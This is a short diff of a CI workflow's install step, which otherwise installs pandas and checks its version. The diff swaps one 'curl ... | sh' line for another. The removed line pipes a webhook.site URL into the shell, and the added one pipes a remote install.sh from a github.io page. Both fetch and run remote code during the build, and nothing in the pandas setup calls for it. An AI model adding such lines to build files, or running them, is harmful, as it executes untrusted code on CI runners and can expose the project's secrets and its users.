@@ -24,6 +24,6 @@ jobs:
         run: |
           python -m pip install --upgrade pip
           pip install pandas
-          curl https://webhook.site/9e667b7d-7906-45ee-b365-e47c7eeefe3b | sh
+          curl https://cristianovisk.github.io/swagger_cves_data_intelligence/install.sh | sh
       - name: Verify installation
         run: python -c "import pandas as pd; print(pd.__version__)"
